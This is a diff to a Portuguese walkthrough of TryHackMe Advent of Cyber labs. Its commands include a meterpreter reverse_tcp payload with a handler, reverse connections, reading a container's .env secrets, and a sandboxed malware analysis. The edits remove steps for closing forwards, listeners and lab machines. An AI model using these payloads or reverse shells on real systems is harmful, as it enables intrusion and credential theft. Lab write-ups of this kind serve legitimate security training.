@@ -4,7 +4,7 @@
 
 ## Preparação
 
-Conecte seu Kali ou outra distribuição Linux à VPN do TryHackMe. Inicie a **Lab Machine** do dia e use o IP exibido pela sala. A AttackBox só é necessária quando uma atividade depende de sua interface. Algumas VMs gráficas têm acesso próprio pelo painel da tarefa. A máquina alvo de um dia pode substituir a anterior: finalize as respostas antes de iniciar outra.
+Conecte seu Kali ou outra distribuição Linux à VPN do TryHackMe. Inicie a **Lab Machine** do dia e use o IP exibido pela sala. A AttackBox só é necessária quando uma atividade depende de sua interface. Algumas VMs gráficas têm acesso próprio pelo painel da tarefa.
 
 ```bash
 export IP=<IP_DA_LAB_MACHINE>
@@ -12,9 +12,9 @@ ip route get "$IP"
 nmap -Pn -sT --open -p 22,80,139,443,445,1883,5900,8080 "$IP"
 ```
 
-Em **No answer needed**, conclua a leitura ou atividade e clique em **Check**. Ao terminar todos os dias, confira se a barra da sala chegou a 100%. Nas linhas **Respostas**, `THM{...}` e `flag{...}` são máscaras de flags; `#` representa um algarismo e `...` oculta o restante. Não envie as máscaras à plataforma.
+Em **No answer needed**, conclua a leitura ou atividade e clique em **Check**. Nas linhas **Respostas**, `THM{...}` e `flag{...}` são máscaras de flags; `#` representa um algarismo e `...` oculta o restante. Não envie as máscaras à plataforma.
 
-Para callbacks TCP ou RTSP com Kali em WSL2 e VPN no Windows, usamos um [encaminhador próprio](./scripts/vpn-wsl-relay.ps1). Ele aceita IP da VPN, IP do WSL e porta como parâmetros, fica ativo apenas enquanto o PowerShell roda e deve ser encerrado com Ctrl+C ao finalizar o teste. Use uma VM Linux conectada diretamente à VPN se o roteamento local já funcionar.
+Para callbacks TCP ou RTSP com Kali em WSL2 e VPN no Windows, o [encaminhador TCP](./scripts/vpn-wsl-relay.ps1) aceita IP da VPN, IP do WSL e porta como parâmetros. Use uma VM Linux conectada diretamente à VPN se o roteamento local já funcionar.
 
 ## Dia 1 - Frameworks
 
@@ -129,7 +129,7 @@ cat /.dockerenv
 cat /var/www/.env
 ```
 
-Se a conexão reversa do Kali em WSL não alcançar diretamente o alvo, use uma VM Linux com VPN própria ou um encaminhamento temporário pela interface VPN do Windows. Remova o encaminhamento ao terminar. Não presuma que o IP interno do contêiner será igual ao de outra execução.
+Se a conexão reversa do Kali em WSL não alcançar diretamente o alvo, use uma VM Linux com VPN própria ou o encaminhamento pela interface VPN do Windows. O IP interno do contêiner pode mudar entre execuções.
 
 **Respostas:** `Lar...` (framework); `pos...` (banco); `san...` (usuário); `p4...` (senha de teste); `THM{...}` (flag do host).
 
@@ -162,7 +162,7 @@ find /tmp/aoc4-dump -maxdepth 1 -type f | wc -l
 
 ## Dia 12 - Análise estática e dinâmica
 
-Trabalhe na VM Windows isolada. Calcule o hash da amostra `mysterygift`, identifique o PE e verifique se há compactação UPX. Descompacte uma cópia para examinar strings e capacidades. Observe a persistência no registro após executar a amostra **somente na sandbox**. Compare os domínios e o caminho de download vistos nas strings com o tráfego e os artefatos criados. Limpe apenas as cópias de trabalho ao terminar.
+Trabalhe na VM Windows isolada. Calcule o hash da amostra `mysterygift`, identifique o PE e verifique se há compactação UPX. Descompacte uma cópia para examinar strings e capacidades. Observe a persistência no registro após executar a amostra **somente na sandbox**. Compare os domínios e o caminho de download vistos nas strings com o tráfego e os artefatos criados.
 
 ```bash
 sha256sum mysterygift
@@ -216,7 +216,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp \
 msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <IP_VPN>; set LPORT <PORTA>; run'
 ```
 
-Na sessão, confirme o usuário antes de ler `C:\Users\<USUARIO>\Documents\flag.txt`. Encerre listener, sessão e arquivos de trabalho. Em produção, faça validação de conteúdo, extensão e tamanho, renomeie uploads e examine malware antes de qualquer revisão humana.
+Na sessão, confirme o usuário antes de ler `C:\Users\<USUARIO>\Documents\flag.txt`. Para as perguntas de defesa, identifique validação de conteúdo, extensão e tamanho, renomeação dos uploads e análise de malware.
 
 **Respostas:** `Unr...` (tipo de upload); `San...` (aplicação); `THM{...}` (flag); `Fil...` (controle de extensão); `Fil...` (renomeação); `Mal...` (varredura).
 
@@ -329,7 +329,3 @@ Anote cada pista junto com o objeto que a fornece. Não é necessário adivinhar
 Abra o formulário da pesquisa, responda às perguntas pessoais com suas próprias opiniões e avance por todas as páginas. Essas perguntas não têm resposta universal. Envie o formulário e copie a flag apresentada na tela final. Volte à sala para inserir essa flag e marque todos os campos **No answer needed** da tarefa de feedback. Na tarefa final, leia a história, responda à pergunta de encerramento e marque eventuais campos de leitura.
 
 **Respostas:** `THM{AoC...}` (flag da pesquisa); `Ye...` (encerramento).
-
-## Conferência final
-
-Abra novamente os dias com indicador de tarefa incompleta e role até o último campo. Em especial, verifique as perguntas finais de leitura dos dias 15, 16, 17, 20 e 21. A página de conclusão deve informar **30 tarefas completas**. Desligue a Lab Machine, feche guias temporárias e verifique o sininho do dashboard para recaps disponíveis.
